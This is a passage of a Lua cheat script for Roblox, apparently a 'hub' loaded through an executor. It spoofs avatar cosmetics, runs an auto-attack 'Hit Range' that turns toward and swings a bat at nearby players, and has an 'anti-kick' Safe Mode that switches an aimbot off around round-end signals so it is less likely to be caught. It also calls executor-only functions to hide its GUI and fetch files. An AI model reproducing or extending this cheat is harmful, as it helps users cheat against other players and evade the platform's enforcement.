            playerSPRenderConn = nil
        end

        for _, conn in ipairs(playerSPConnections) do
            pcall(function() conn:Disconnect() end)
        end
        playerSPConnections = {}

        for player, data in pairs(playerData) do
            removePlayerESP(player)
        end
        playerData = {}
    end
end

-- ============================================
-- AVATAR (Nexus port): Headless + Korblox (client-side cosmetics)
-- ============================================
local HEADLESS_MESH_ID  = "rbxassetid://1095708"
local KORBLOX_MESH_ID   = "rbxassetid://101851696"
local KORBLOX_TEXTURE_ID = "rbxassetid://101851254"
local cosmeticState = setmetatable({}, {__mode = "k"})

function applyHeadless(char, enabled)
    local head = char and char:FindFirstChild("Head"); if not head then return end
    local state = cosmeticState[char] or {}; cosmeticState[char] = state
    if enabled then
        if state.headTransparency == nil then
            state.headTransparency = head.Transparency; state.headCanCollide = head.CanCollide
            local face = head:FindFirstChild("face"); state.face = face and face:Clone() or nil
        end
        head.Transparency = 1; head.CanCollide = false
        local face = head:FindFirstChild("face"); if face then face:Destroy() end
        local old = head:FindFirstChild("HorizonHeadlessMesh"); if old then old:Destroy() end
        local mesh = Instance.new("SpecialMesh", head)
        mesh.Name = "HorizonHeadlessMesh"; mesh.MeshType = Enum.MeshType.FileMesh
        mesh.MeshId = HEADLESS_MESH_ID; mesh.Scale = Vector3.new(.001, .001, .001)
    else
        local mesh = head:FindFirstChild("HorizonHeadlessMesh"); if mesh then mesh:Destroy() end
        if state.headTransparency ~= nil then
            head.Transparency = state.headTransparency; head.CanCollide = state.headCanCollide
            if state.face and not head:FindFirstChild("face") then state.face:Clone().Parent = head end
            state.headTransparency = nil; state.headCanCollide = nil; state.face = nil
        end
    end
end

function applyKorblox(char, enabled)
    local hum = char and char:FindFirstChildOfClass("Humanoid"); if not hum then return end
    local state = cosmeticState[char] or {}; cosmeticState[char] = state
    if hum.RigType == Enum.HumanoidRigType.R6 then
        local leg = char:FindFirstChild("Right Leg"); if not leg then return end
        if enabled then
            if not state.r6LegColor then
                state.r6LegColor = leg.Color; state.r6Meshes = {}
                for _, v in ipairs(leg:GetChildren()) do
                    if v:IsA("SpecialMesh") or v:IsA("CharacterMesh") then
                        table.insert(state.r6Meshes, v:Clone()); v:Destroy()
                    end
                end
            end
            leg.Color = Color3.fromRGB(64, 64, 64)
            local old = leg:FindFirstChild("HorizonKorbloxMesh"); if old then old:Destroy() end
            local mesh = Instance.new("SpecialMesh", leg)
            mesh.Name = "HorizonKorbloxMesh"; mesh.MeshType = Enum.MeshType.FileMesh
            mesh.MeshId = KORBLOX_MESH_ID; mesh.TextureId = KORBLOX_TEXTURE_ID
        else
            local mesh = leg:FindFirstChild("HorizonKorbloxMesh"); if mesh then mesh:Destroy() end
            if state.r6LegColor then leg.Color = state.r6LegColor end
            if state.r6Meshes then for _, v in ipairs(state.r6Meshes) do v:Clone().Parent = leg end end
            state.r6LegColor = nil; state.r6Meshes = nil
        end
    else
        local upper = char:FindFirstChild("RightUpperLeg")
        local lower = char:FindFirstChild("RightLowerLeg")
        local foot  = char:FindFirstChild("RightFoot")
        if not upper then return end
        if enabled then
            if not state.r15Transparency then
                state.r15Transparency = {upper.Transparency, lower and lower.Transparency or 0, foot and foot.Transparency or 0}
            end
            upper.Transparency = 1; if lower then lower.Transparency = 1 end; if foot then foot.Transparency = 1 end
            local old = char:FindFirstChild("HorizonKorbloxLeg"); if old then old:Destroy() end
            local leg = Instance.new("Part", char)
            leg.Name = "HorizonKorbloxLeg"; leg.Size = Vector3.new(1, 2, 1)
            leg.Anchored = false; leg.CanCollide = false; leg.Massless = true; leg.Color = Color3.fromRGB(64, 64, 64)
            local mesh = Instance.new("SpecialMesh", leg)
            mesh.MeshType = Enum.MeshType.FileMesh; mesh.MeshId = KORBLOX_MESH_ID; mesh.TextureId = KORBLOX_TEXTURE_ID
            local weld = Instance.new("Weld", leg)
            weld.Name = "HorizonKorbloxWeld"; weld.Part0 = upper; weld.Part1 = leg; weld.C0 = CFrame.new(0, -.8, 0)
        else
            local vals = state.r15Transparency
            if vals then
                upper.Transparency = vals[1]
                if lower then lower.Transparency = vals[2] end
                if foot then foot.Transparency = vals[3] end
            end
            local leg = char:FindFirstChild("HorizonKorbloxLeg"); if leg then leg:Destroy() end
            state.r15Transparency = nil
        end
    end
end

-- re-apply cosmetics on respawn
LP.CharacterAdded:Connect(function(char)
    task.wait(0.8)
    pcall(function()
        if __HH.headlessEnabled then applyHeadless(char, true) end
        if __HH.korbloxEnabled then applyKorblox(char, true) end
    end)
end)

-- ============================================
-- CATALOG CHANGER (VisDuels port): Pack Accessory — Bleed 1 / Bleed 2 / Bleed 3
-- Changes shirt / pants / head / accessory / korblox (client-side).
-- ============================================
currentAccessoryPack = "Off"
__HH.OriginalOutfit = {shirt = nil, pants = nil}
__HH.OriginalAccessories = {}

local ACCESSORY_PACK_ORDER = {
    {"Off", "Off"},
    {"Bleed 1", "Bleed 1"},
    {"Bleed 2", "Bleed 2"},
    {"Bleed 3", "Bleed 3"},
}

local BLEED_PACKS = {
    ["Bleed 1"] = {
        accessory = 306969564,
        offset = Vector3.new(0.0000, 0.3000, 0.0000),
        headMesh = "http://www.roblox.com/asset/?id=134079402",
        headTexture = "http://www.roblox.com/asset/?id=133940918",
        shirt = "http://www.roblox.com/asset/?id=10632503795",
        pants = "http://www.roblox.com/asset/?id=123161592384863",
        korblox = "right",
    },
    ["Bleed 2"] = {
        accessory = 1744060292,
        offset = Vector3.new(0.0000, 1.4000, -0.2000),
        headMesh = "http://www.roblox.com/asset/?id=134079402",
        headTexture = "http://www.roblox.com/asset/?id=133940918",
        shirt = "http://www.roblox.com/asset/?id=11526718530",
        pants = "http://www.roblox.com/asset/?id=93710523210027",
        korblox = "right",
    },
    ["Bleed 3"] = {
        accessory = 112564966849233,
        offset = Vector3.new(0.0000, 0.6000, 0.0000),
        headMesh = "http://www.roblox.com/asset/?id=134079402",
        headTexture = "http://www.roblox.com/asset/?id=133940918",
        shirt = "http://www.roblox.com/asset/?id=11849088376",
        pants = "http://www.roblox.com/asset/?id=16534673928",
        korblox = "right",
    },
}

local function saveOriginalOutfit(char)
    if not char then return end
    local shirt = char:FindFirstChildWhichIsA("Shirt")
    local pants = char:FindFirstChildWhichIsA("Pants")
    __HH.OriginalOutfit.shirt = shirt and shirt.ShirtTemplate or nil
    __HH.OriginalOutfit.pants = pants and pants.PantsTemplate or nil
end

local function restoreOriginalOutfit(char)
    if not char then return end
    for _, obj in ipairs(char:GetChildren()) do
        if obj:IsA("Shirt") or obj:IsA("Pants") then
            obj:Destroy()
        end
    end
    if __HH.OriginalOutfit.shirt then
        local newShirt = Instance.new("Shirt")
        newShirt.ShirtTemplate = __HH.OriginalOutfit.shirt
        newShirt.Parent = char
    end
    if __HH.OriginalOutfit.pants then
        local newPants = Instance.new("Pants")
        newPants.PantsTemplate = __HH.OriginalOutfit.pants
        newPants.Parent = char
    end
    __HH.OriginalOutfit.shirt = nil
    __HH.OriginalOutfit.pants = nil
end

local function clearAllOutfit(char)
    if not char then return end
    for _, obj in ipairs(char:GetChildren()) do
        if obj:IsA("Shirt") or obj:IsA("Pants") then
            obj:Destroy()
        end
    end
end

local function saveOriginalAccessories(char)
    __HH.OriginalAccessories = {}
    if not char then return end
    for _, child in ipairs(char:GetChildren()) do
        if child:IsA("Accessory") or child:IsA("Hat") then
            local clone = child:Clone()
            table.insert(__HH.OriginalAccessories, clone)
        end
    end
end

local function restoreOriginalAccessories(char)
    if not char then return end
    for _, child in ipairs(char:GetChildren()) do
        if child:IsA("Accessory") or child:IsA("Hat") or child.Name == "AuFfitAccessory" then
            child:Destroy()
        end
    end
    for _, clone in ipairs(__HH.OriginalAccessories) do
        if clone and clone.Parent == nil then
            local newAcc = clone:Clone()
            newAcc.Parent = char
            for _, weld in ipairs(newAcc:GetDescendants()) do
                if weld:IsA("Weld") or weld:IsA("WeldConstraint") then
                    if weld:IsA("Weld") then
                        local part0Name = weld.Part0 and weld.Part0.Name
                        local part1Name = weld.Part1 and weld.Part1.Name
                        if part0Name then
                            local newPart0 = char:FindFirstChild(part0Name)
                            if newPart0 then weld.Part0 = newPart0 end
                        end
                        if part1Name then
                            local newPart1 = char:FindFirstChild(part1Name)
                            if newPart1 then weld.Part1 = newPart1 end
                        end
                    elseif weld:IsA("WeldConstraint") then
                        local part0Name = weld.Part0 and weld.Part0.Name
                        local part1Name = weld.Part1 and weld.Part1.Name
                        if part0Name then
                            local newPart0 = char:FindFirstChild(part0Name)
                            if newPart0 then weld.Part0 = newPart0 end
                        end
                        if part1Name then
                            local newPart1 = char:FindFirstChild(part1Name)
                            if newPart1 then weld.Part1 = newPart1 end
                        end
                    end
                end
            end
        end
    end
    __HH.OriginalAccessories = {}
end

local function clearAllAccessories(char)
    if not char then return end
    for _, child in ipairs(char:GetChildren()) do
        if child:IsA("Accessory") or child:IsA("Hat") or child.Name == "AuFfitAccessory" then
            child:Destroy()
        end
        if child.Name:find("Korblox_") or child.Name:find("Headless_") then
            child:Destroy()
        end
    end
    local partsToHide = {"Head", "LeftUpperLeg", "LeftLowerLeg", "LeftFoot", "RightUpperLeg", "RightLowerLeg", "RightFoot"}
    for _, partName in ipairs(partsToHide) do
        local part = char:FindFirstChild(partName)
        if part and part:IsA("BasePart") then
            part.Transparency = 0
        end
    end
    local head = char:FindFirstChild("Head")
    if head and head:IsA("MeshPart") then
        head.Transparency = 0
    end
end

local function applyBleedOutfit(packName)
    local config = BLEED_PACKS[packName]
    if not config then return false end

    local char = LP.Character
    if not char then return false end

    char:WaitForChild("Head", 10)
    local head = char:FindFirstChild("Head")
    if not head then return false end

    if config.headMesh then
        for _, d in ipairs(char:GetChildren()) do
            if d:IsA("CharacterMesh") and d.BodyPart == Enum.BodyPart.Head then
                pcall(function() d:Destroy() end)
            end
        end
        local done = false
        if head:IsA("MeshPart") then
            done = pcall(function()
                head.MeshId = config.headMesh
                if config.headTexture then head.TextureID = config.headTexture end
            end)
        end
        if not done then
            local sm = head:FindFirstChildWhichIsA("SpecialMesh") or Instance.new("SpecialMesh")
            sm.Parent = head
            sm.MeshType = Enum.MeshType.FileMesh
            sm.MeshId = config.headMesh
            sm.TextureId = config.headTexture or ""
        end
    end

    if config.shirt then
        local s = char:FindFirstChildWhichIsA("Shirt") or Instance.new("Shirt")
        s.Name = "Shirt"; s.ShirtTemplate = config.shirt; s.Parent = char
    end
    if config.pants then
        local p = char:FindFirstChildWhichIsA("Pants") or Instance.new("Pants")
        p.Name = "Pants"; p.PantsTemplate = config.pants; p.Parent = char
    end

    if config.accessory and head then
        local old = char:FindFirstChild("AuFfitAccessory")
        if old then old:Destroy() end
        local objs = nil
        local ok, res = pcall(function()
            return game:GetObjects("rbxassetid://" .. tostring(config.accessory))
        end)
        if ok and typeof(res) == "table" and #res > 0 then
            objs = res
        else
            ok, res = pcall(function()
                return game:GetService("InsertService"):LoadAsset(config.accessory)
            end)
            if ok and res then objs = {res} end
        end
        if objs then
            local handle
            for _, o in ipairs(objs) do
                if o:IsA("BasePart") then handle = o; break end
                local f = o:FindFirstChildWhichIsA("BasePart", true)
                if f then handle = f; break end
            end
            if handle then
                local h = handle:Clone()
                h.Name = "AuFfitAccessory"
                h.CanCollide = false
                h.Anchored = false
                h.Massless = true
                h.Parent = char
                local weld = Instance.new("Weld")
                weld.Part0 = head
                weld.Part1 = h
                weld.C0 = CFrame.new(config.offset or Vector3.zero)
                weld.Parent = h
            end
            for _, o in ipairs(objs) do pcall(function() o:Destroy() end) end
        end
    end

    if config.korblox and config.korblox ~= "none" then
        local function attachKorblox(side)
            local ids = { left = 139607673, right = 139607718 }
            local targets = { left = "LeftUpperLeg", right = "RightUpperLeg" }
            local hides = {
                left = {"LeftUpperLeg", "LeftLowerLeg", "LeftFoot"},
                right = {"RightUpperLeg", "RightLowerLeg", "RightFoot"}
            }
            local targetPart = char:FindFirstChild(targets[side])
            if not targetPart then return false end
            for _, partName in ipairs(hides[side]) do
                local limb = char:FindFirstChild(partName)
                if limb and limb:IsA("BasePart") then limb.Transparency = 1 end
            end
            local success, objects = pcall(function()
                return game:GetObjects("rbxassetid://" .. ids[side])
            end)
            if not success or not objects or #objects == 0 then return false end
            local assetModel = objects[1]
            local mainMesh = assetModel:IsA("BasePart") and assetModel or assetModel:FindFirstChildWhichIsA("BasePart", true)
            if not mainMesh then assetModel:Destroy(); return false end
            mainMesh.CanCollide = false
            mainMesh.Massless = true
            mainMesh.CFrame = targetPart.CFrame
            local weld = Instance.new("WeldConstraint")
            weld.Part0 = targetPart
            weld.Part1 = mainMesh
            weld.Parent = mainMesh
            assetModel.Parent = char
            return true
        end
        if config.korblox == "left" then
            attachKorblox("left")
        elseif config.korblox == "right" then
            attachKorblox("right")
        end
    end

    return true
end

function applyAccessoryPack(packName)
    local char = LP.Character
    if not char then return end

    if packName == "Off" then
        clearAllAccessories(char)
        restoreOriginalOutfit(char)
        restoreOriginalAccessories(char)
        return
    end

    if not __HH.OriginalOutfit.shirt and not __HH.OriginalOutfit.pants then
        saveOriginalOutfit(char)
    end
    if #__HH.OriginalAccessories == 0 then
        saveOriginalAccessories(char)
    end

    clearAllOutfit(char)
    clearAllAccessories(char)
    applyBleedOutfit(packName)
end

-- re-apply pack on respawn (same as VisDuels reapplyAllStates)
LP.CharacterAdded:Connect(function(char)
    if currentAccessoryPack and currentAccessoryPack ~= "Off" then
        task.wait(0.3)
        if LP.Character == char and currentAccessoryPack ~= "Off" then
            pcall(function() applyAccessoryPack(currentAccessoryPack) end)
        end
    end
end)

pcall(function()
    local cg = game:GetService("CoreGui")
    for _, name in ipairs({"Pure Hub", "Bloom Hub", "Horizon Hub", "Pure hub", "HorizonHubMobileButtons", "PureHubMobileButtons", "VynxMobileButtons", "YousefIntro", "StealBarGui"}) do
        local old = cg:FindFirstChild(name)
        if old then old:Destroy() end
    end
    local pg = LP:FindFirstChild("PlayerGui")
    if pg then
        for _, name in ipairs({"Pure Hub", "Bloom Hub", "Horizon Hub", "Pure hub", "StealBarGui", "YousefIntro", "VynxMobileButtons"}) do
            local old = pg:FindFirstChild(name)
            if old then old:Destroy() end
        end
    end
end)
_G.VYNX_LOADED = true

-- =============== SAFE MODE: CERTZ 5s / GUI PHRASE 2s + 5s ===============
do
    -- Keep all Safe Mode state inside one table so this large script does not
    -- gain many long-lived top-level locals (Luau has a local/register limit).
    local SM = {
        duration          = 5,
        guiLeadDelay      = 2,
        activeDuration    = 5,
        signalCooldown    = 1,
        liveCooldown      = 10,
        roundSignalTime   = 0,
        restoreThread     = nil,
        lastSignalAt      = 0,
        lastGuiSignalAt   = 0,
        p3                = Vector3.new(-476.752, 10.464,   7.107),
        p7                = Vector3.new(-476.752, 10.464, 114.107),
        lastName          = "",
        lastValue         = 0,
        lastLiveAt        = 0,
        wasEnabled        = false,
        generation        = (_G.AceSafeModeGeneration or 0) + 1,
    }
    _G.AceSafeModeGeneration = SM.generation

    function _G.AceSafeModeGetCountdownLabel() return nil end
    function _G.AceSafeModeCountdownNumber(text) return false end
    function _G.AceSafeModeInDuelCountdown() return false end

    function _G.AceSafeModeIsLocked()
        if antiKickEnabled ~= true or SM.roundSignalTime <= 0 then return false end
        return tick() - SM.roundSignalTime < SM.activeDuration
    end

    function _G.AceSafeModeForceStop(reason)
        -- Drop-then-Aim may bypass ordinary manual stops, but it must never
        -- bypass an active Safe Mode window. Otherwise its restore coroutine
        -- can turn AIM BOT back on 1-2 seconds early in later rounds.
        local safeLocked = _G.AceSafeModeIsLocked
            and _G.AceSafeModeIsLocked() == true
        if not safeLocked and (_G.PureDropThenAimCycleActive == true
        or _G.PureDropThenAimSafeModeAuthorized == true) then
            return false
        end

        local backendOn = false
        if _G.PureCursedGetAimbot then
            local ok, enabled = pcall(_G.PureCursedGetAimbot)
            backendOn = ok and enabled == true
        end
        if not __HH.batV2Enabled and not backendOn then return false end

        antiKickAimPending = false
        __HH.batV2Enabled = false
        if stopAimbotFull then
            pcall(stopAimbotFull)
        elseif _G.PureCursedSetAimbot then
            pcall(_G.PureCursedSetAimbot, false)
        end
        if __HH.batV2SetVisual then __HH.batV2SetVisual(false) end
        if __HH.mobBtnRefs and __HH.mobBtnRefs.batV2 then __HH.mobBtnRefs.batV2(false) end
        return true
    end

    function _G.AceSafeModeRestorePendingAim()
        antiKickAimPending = false
        return false
    end

    function _G.AceSafeModeTryStart(allowDropThenAim)
        if not (_G.AceSafeModeIsLocked and _G.AceSafeModeIsLocked()) then
            return true
        end
        antiKickAimPending = false
        _G.AceSafeModeForceStop("AIM BOT BEFORE START")
        return false
    end

    local function _smOnRoundSignal(source)
        if antiKickEnabled ~= true then return false end

        local now = tick()
        local isGuiPhrase = source == "WON THIS ROUND GUI SAFE MODE"

        -- Certz can detect the result shortly before the visible GUI sentence.
        -- The GUI sentence is authoritative: it is allowed to realign the timer
        -- once, while repeated Text events are ignored. After the sentence, a
        -- late Certz snapshot cannot shorten or restart that same round.
        if isGuiPhrase then
            if SM.lastGuiSignalAt > 0
            and now - SM.lastGuiSignalAt < 1 then return false end
            SM.lastGuiSignalAt = now
        else
            if SM.lastGuiSignalAt > 0
            and now - SM.lastGuiSignalAt < (SM.duration + SM.guiLeadDelay) then return false end
            if SM.lastSignalAt > 0
            and now - SM.lastSignalAt < SM.signalCooldown then return false end
        end

        -- Certz starts a direct five-second pause. The GUI sentence starts with
        -- a two-second lead, followed by the same five-second pause (seven total).
        SM.activeDuration = SM.duration + (isGuiPhrase and SM.guiLeadDelay or 0)
        SM.lastSignalAt = now
        SM.roundSignalTime = now

        -- A completed carry handoff leaves this flag true. Clear that stale
        -- authorization at every new round so it cannot defeat Safe Mode.
        _G.PureDropThenAimSafeModeAuthorized = false
        _G.AceSafeModeForceStop(source or "ROUND SAFE MODE")
        print(string.format(
            "[SAFE MODE] signal=%s | lead=%.2fs | countdown=%.2fs | total=%.2fs",
            tostring(source or "unknown"),
            isGuiPhrase and SM.guiLeadDelay or 0,
            SM.duration,
            SM.activeDuration
        ))

        if SM.restoreThread then
            pcall(task.cancel, SM.restoreThread)
            SM.restoreThread = nil
        end

        SM.restoreThread = task.delay(SM.activeDuration, function()
            if _G.AceSafeModeGeneration ~= SM.generation then
                SM.restoreThread = nil
                return
            end
            SM.restoreThread = nil
            antiKickAimPending = false
            -- Manual behavior requested: when the Safe Mode timer ends, AIM BOT
            -- stays OFF and can only be enabled again by the user.
            print("[SAFE MODE] timer ended; AIM BOT remains OFF until manually enabled")
        end)
        return true
    end

    local function _smNum(value)
        value = tostring(value):gsub("%s", "")
        local number, suffix = value:match("([%d%.]+)(%a?)")
        number = tonumber(number) or 0
        if suffix == "K" or suffix == "k" then number = number * 1e3
        elseif suffix == "M" or suffix == "m" then number = number * 1e6
        elseif suffix == "B" or suffix == "b" then number = number * 1e9
        elseif suffix == "T" or suffix == "t" then number = number * 1e12 end
        return number
    end

    local function _smMyPlot()
        for _, object in ipairs(workspace:GetDescendants()) do
            if object:IsA("BasePart") and object.Name == "PlotSign" then
                local d3 = (object.Position - SM.p3).Magnitude
                local d7 = (object.Position - SM.p7).Magnitude
                if d3 < 5 or d7 < 5 then
                    for _, label in ipairs(object:GetDescendants()) do
                        if label:IsA("TextLabel") and label.Text ~= "" then
                            if label.Text:find(LP.Name, 1, true)
                            or label.Text:find(LP.DisplayName, 1, true) then
                                return d3 < 5 and 3 or 7
                            end
                        end
                    end
                end
            end
        end
        return nil
    end

    -- Certz live-win logic, merged only as a Safe Mode round signal. It does
    -- not send a webhook and deliberately does not check which player won.
    -- The first valid snapshot is accepted immediately, which covers the first
    -- round instead of waiting for a previous "won this round!" GUI sentence.
    task.spawn(function()
        while _G.AceSafeModeGeneration == SM.generation do
            repeat
            task.wait(1)

            if antiKickEnabled ~= true then
                SM.wasEnabled = false
                SM.roundSignalTime = 0
                SM.activeDuration = SM.duration
                SM.lastSignalAt = 0
                SM.lastGuiSignalAt = 0
                if SM.restoreThread then
                    pcall(task.cancel, SM.restoreThread)
                    SM.restoreThread = nil
                end
                break -- continue
            end

            if not SM.wasEnabled then
                SM.wasEnabled = true
                SM.lastName = ""
                SM.lastValue = 0
                SM.lastLiveAt = 0
            end

            local mine = _smMyPlot()
            if not mine then break --[[continue]] end

            local opponentPosition = mine == 3 and SM.p7 or SM.p3
            local debris = workspace:FindFirstChild("Debris")
            if not debris then break --[[continue]] end

            local bestName, bestValue
            for _, object in ipairs(debris:GetChildren()) do
                repeat
                if object.Name ~= "FastOverheadTemplate" then break --[[continue]] end

                local surface = object:FindFirstChildOfClass("SurfaceGui")
                if not surface or not surface.Adornee then break --[[continue]] end
                if (surface.Adornee.Position - opponentPosition).Magnitude > 50 then break --[[continue]] end

                local generation = surface:FindFirstChild("Generation", true)
                if generation and generation:IsA("TextLabel") then
                    local value = _smNum(generation.Text)
                    if not bestValue or value > bestValue then
                        bestValue = value
                        local displayName = surface:FindFirstChild("DisplayName", true)
                        bestName = displayName and displayName.Text or object.Name
                    end
                end
                until true
            end

            if bestName and bestValue then
                local changed = bestName ~= SM.lastName or bestValue ~= SM.lastValue
                if changed then
                    local firstSnapshot = SM.lastName == "" and SM.lastValue == 0
                    SM.lastName = bestName
                    SM.lastValue = bestValue

                    local now = tick()
                    if firstSnapshot or now - SM.lastLiveAt > SM.liveCooldown then
                        SM.lastLiveAt = now
                        _smOnRoundSignal(firstSnapshot
                            and "FIRST ROUND LIVE-WIN SAFE MODE"
                            or "LIVE-WIN CHANGE SAFE MODE")
                    end
                end
            end
            until true
        end
    end)

    local function _smStrip(text)
        return text and text:gsub("<[^>]+>", "") or ""
    end

    local function _smScan(object)
        if _G.AceSafeModeGeneration ~= SM.generation then return end
        if not (object:IsA("TextLabel")
        or object:IsA("TextButton")
        or object:IsA("TextBox")) then return end

        local clean = _smStrip(object.Text):lower()
        -- Ignore punctuation so both "won this round" and
        -- "won this round!" are accepted after RichText tags are removed.
        if clean:find("won this round", 1, true) then
            _smOnRoundSignal("WON THIS ROUND GUI SAFE MODE")
        end
    end

    local playerGui = LP:WaitForChild("PlayerGui")
    for _, object in ipairs(playerGui:GetDescendants()) do
        pcall(_smScan, object)
        if object:IsA("TextLabel")
        or object:IsA("TextButton")
        or object:IsA("TextBox") then
            object:GetPropertyChangedSignal("Text"):Connect(function()
                pcall(_smScan, object)
            end)
        end
    end
    playerGui.DescendantAdded:Connect(function(object)
        pcall(_smScan, object)
        if object:IsA("TextLabel")
        or object:IsA("TextButton")
        or object:IsA("TextBox") then
            object:GetPropertyChangedSignal("Text"):Connect(function()
                pcall(_smScan, object)
            end)
        end
    end)

    if _G.AceSafeModeMonitorConn then
        pcall(function() _G.AceSafeModeMonitorConn:Disconnect() end)
    end
    _G.AceSafeModeMonitorStarted = nil
    _G.AceSafeModeMonitorConn = RunService.Heartbeat:Connect(function()
        if _G.AceSafeModeGeneration ~= SM.generation then return end
        if not _G.AceSafeModeIsLocked() then
            antiKickAimPending = false
            if _G.PureDropThenAimCycleActive ~= true then
                _G.PureDropThenAimSafeModeAuthorized = false
            end
            return
        end
        -- Keep enforcing the lock even if Drop-then-Aim finishes during it.
        -- That coroutine may restore AIM BOT once; this heartbeat turns it back
        -- off immediately and the normal Safe Mode timer remains authoritative.
        _G.AceSafeModeForceStop("SAFE MODE HEARTBEAT")
    end)
end
-- =====================================================


-- Irish-style Hit Range, recolored light blue for Horizon.
local HorizonHitRange = {enabled=false, conn=nil, circle=nil, align=nil, attach=nil}
local function stopHorizonHitRange()
    HorizonHitRange.enabled=false
    if HorizonHitRange.conn then HorizonHitRange.conn:Disconnect(); HorizonHitRange.conn=nil end
    if HorizonHitRange.circle then HorizonHitRange.circle:Destroy(); HorizonHitRange.circle=nil end
    if HorizonHitRange.align then HorizonHitRange.align:Destroy(); HorizonHitRange.align=nil end
    if HorizonHitRange.attach then HorizonHitRange.attach:Destroy(); HorizonHitRange.attach=nil end
    local char=LP.Character; local hum=char and char:FindFirstChildOfClass("Humanoid")
    if hum then hum.AutoRotate=true end
end
local function startHorizonHitRange()
    stopHorizonHitRange()
    local char=LP.Character or LP.CharacterAdded:Wait()
    local hrp=char:WaitForChild("HumanoidRootPart",5)
    local hum=char:FindFirstChildOfClass("Humanoid")
    if not hrp or not hum then return end
    HorizonHitRange.enabled=true
    HorizonHitRange.attach=Instance.new("Attachment",hrp)
    HorizonHitRange.align=Instance.new("AlignOrientation",hrp)
    HorizonHitRange.align.Attachment0=HorizonHitRange.attach
    HorizonHitRange.align.Mode=Enum.OrientationAlignmentMode.OneAttachment
    HorizonHitRange.align.RigidityEnabled=true
    HorizonHitRange.circle=Instance.new("Part")
    HorizonHitRange.circle.Name="HorizonBlueHitRange"
    HorizonHitRange.circle.Shape=Enum.PartType.Cylinder
    HorizonHitRange.circle.Material=Enum.Material.Neon
    HorizonHitRange.circle.Size=Vector3.new(0.05,14.5,14.5)
    HorizonHitRange.circle.Color=Color3.fromRGB(173, 225, 255)
    HorizonHitRange.circle.Transparency=0.35
    HorizonHitRange.circle.CanCollide=false
    HorizonHitRange.circle.CanTouch=false
    HorizonHitRange.circle.CanQuery=false
    HorizonHitRange.circle.Massless=true
    HorizonHitRange.circle.Parent=workspace
    local weld=Instance.new("Weld")
    weld.Part0=hrp; weld.Part1=HorizonHitRange.circle
    weld.C0=CFrame.new(0,-1,0)*CFrame.Angles(0,0,math.rad(90))
    weld.Parent=HorizonHitRange.circle
    HorizonHitRange.conn=RunService.RenderStepped:Connect(function()
        if not HorizonHitRange.enabled then return end
        local c=LP.Character; local root=c and c:FindFirstChild("HumanoidRootPart")
        local h=c and c:FindFirstChildOfClass("Humanoid")
        if not root or not h then return end
        local target, dmin=nil, 7.25
        for _,p in ipairs(Players:GetPlayers()) do
            if p~=LP and p.Character then
                local tr=p.Character:FindFirstChild("HumanoidRootPart")
                local th=p.Character:FindFirstChildOfClass("Humanoid")
                if tr and th and th.Health>0 then
                    local d=(tr.Position-root.Position).Magnitude
                    if d<=dmin then target=tr; dmin=d end
                end
            end
        end
        if target then
            h.AutoRotate=false
            HorizonHitRange.align.Enabled=true
            HorizonHitRange.align.CFrame=CFrame.lookAt(root.Position,Vector3.new(target.Position.X,root.Position.Y,target.Position.Z))
            local tool=c:FindFirstChild("Bat") or c:FindFirstChild("Medusa")
            if tool then pcall(function() tool:Activate() end) end
        else
            HorizonHitRange.align.Enabled=false
            h.AutoRotate=true
        end
    end)
end
_G.HorizonHitRange={start=startHorizonHitRange,stop=stopHorizonHitRange,enabled=function() return HorizonHitRange.enabled end}

-- Songs section: Irish RIP track.
local HorizonSongSound=nil
local HorizonSongTracks={
    {name="rest in peace to my granny", id="rbxassetid://121252909004354"},
}
local function stopHorizonSong()
    if HorizonSongSound then pcall(function() HorizonSongSound:Stop(); HorizonSongSound:Destroy() end); HorizonSongSound=nil end
end
local function horizonAssetFunction()
    local ok, fn = pcall(function() return getcustomasset end)
    if ok and type(fn) == "function" then return fn end
    local ok2, fn2 = pcall(function() return getsynasset end)
    if ok2 and type(fn2) == "function" then return fn2 end
    if syn and type(syn.getcustomasset) == "function" then return syn.getcustomasset end
    if syn and type(syn.getsynasset) == "function" then return syn.getsynasset end
    return nil
end
local function horizonDownload(url)
    local body=nil
    pcall(function()
        local d=game:HttpGet(url,true)
        if type(d)=="string" and #d>500 then body=d end
    end)
    if not body then
        pcall(function()
            local d=game:HttpGet(url)
            if type(d)=="string" and #d>500 then body=d end
        end)
    end
    if not body then
        local req=syn and syn.request or request or http_request
        if req then
            pcall(function()
                local r=req({Url=url,Method="GET"})
                local d=r and (r.Body or r.body or r.ResponseBody or r.responseBody)
                if type(d)=="string" and #d>500 then body=d end
            end)
        end
    end
    return body
end
local function playHorizonSong(track)
    stopHorizonSong()
    local sound=Instance.new("Sound")
    sound.Volume=1; sound.Looped=true
    if track.id then
        sound.SoundId=track.id
    else
        local assetFunc=horizonAssetFunction()
        if isfile and writefile and assetFunc then
            local bytes=horizonDownload(track.url)
            if bytes then
                pcall(function() writefile(track.file,bytes) end)
                local okAsset,assetId=pcall(function() return assetFunc(track.file) end)
                if okAsset and assetId then sound.SoundId=assetId end
            end
        end
        if sound.SoundId == "" and track.fallback then sound.SoundId=track.fallback end
        if sound.SoundId == "" then sound:Destroy();return end
    end
    sound.Parent=game:GetService("SoundService"); HorizonSongSound=sound
    pcall(function() sound:Play() end)
end


-- ############################################################################
-- ##            AMBITIOUS -> PURE HUB PORT  (added features)               ##
-- ##  1) X-Ray + Brainrot X-Ray                                             ##
-- ##  2) Avatar Changer                                                     ##
-- ##  3) Custom Tools + Custom Tool Selector + Rainbow Tools + Custom Sounds##
-- ##  4) Rainbow Mobile Joystick                                            ##
-- ##  5) Radius Circle + Radius Circle Colour                               ##
-- ############################################################################
do
    local Players           = game:GetService("Players")
    local RunService        = game:GetService("RunService")
    local TweenService      = game:GetService("TweenService")
    local Lighting          = game:GetService("Lighting")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local LP                = Players.LocalPlayer
    local PlayerGui         = LP:WaitForChild("PlayerGui")

    -- Contenitore protetto per i popup (stesso schema dell'Ambitious Hub)
    local HubGui = PlayerGui
    do
        local ok, res = pcall(function()
            if type(gethui) == "function" then return gethui() end
            if type(get_hidden_gui) == "function" then return get_hidden_gui() end
            return game:GetService("CoreGui")
        end)
        if ok and typeof(res) == "Instance" then HubGui = res end
    end

    -- Alias al salvataggio di Pure Hub: l'engine Ambitious lo chiama per nome.
    local function saveAmbitiousConfig()
        pcall(function() if saveConfig then saveConfig() end end)
    end

    -- Helper UI usati dal picker dell'Avatar Changer
    local function corner(o, r)
        local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, r or 8); c.Parent = o; return c
    end
    local function stroke(o, col, th, tr)
        local s = Instance.new("UIStroke")
        s.Color = col or Color3.fromRGB(201, 238, 255)
